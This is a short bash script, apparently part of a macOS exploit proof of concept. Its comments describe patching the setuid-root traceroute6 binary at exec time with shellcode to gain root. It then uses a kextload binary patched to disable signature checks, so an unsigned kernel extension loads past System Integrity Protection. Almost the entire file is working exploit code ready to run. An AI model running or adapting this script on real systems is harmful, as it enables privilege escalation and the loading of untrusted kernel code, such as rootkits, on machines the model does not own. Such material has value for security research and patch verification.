#!/bin/bash

# loading an unsigned kext is a two step process - first we need root
# then we need to get the com.apple.rootless.kext-management entitlement

# so let's build a simple shellscript to run as root:
if [ -z $1 ]
then
  echo 'usage: ./load_kext.sh <path/to/kext>'
  exit $E_MISSING_POS_PARAM
fi

# we have a binary patch for the 10.11.3 version of kextload (which has the kext-management entitlement)
# so lets build a script we can exec as root to apply that patch and load our kext:

# first, we need a thin'ed version of kextload

lipo -thin x86_64 -output kextload_64 `which kextload`

echo '#!/bin/zsh' > kext_loading_helper.sh
echo "# run me as root to load: $1" >> kext_loading_helper.sh
echo "/usr/sbin/chown -R root:wheel $1" >> kext_loading_helper.sh
echo "./executer -p kextload_disable_signature_checks.binpatch -o kextload_64 -- `which kextload` $1" >> kext_loading_helper.sh
chmod +x kext_loading_helper.sh

# build a binary patch to apply to traceroute6 (a suid-root binary, any will do though*) which overwrites
# its entrypoint with shellcode to exec the script we just wrote (note that its a zsh script so will maintain euid 0)
python build_exec_patch.py `which traceroute6` `pwd`/kext_loading_helper.sh traceroute6_exec_kextloader.binpatch

# use the exploit to apply that patch at exec time to the suid-root binary
./executer -p traceroute6_exec_kextloader.binpatch -o `which traceroute6` -- `which traceroute6` -invalid

# cleanup
rm -rf kextload_64 kext_loading_helper.sh traceroute6_exec_kextloader.binpatch

# * if you choose a fat binary pass a lipo'ed thin version to -o
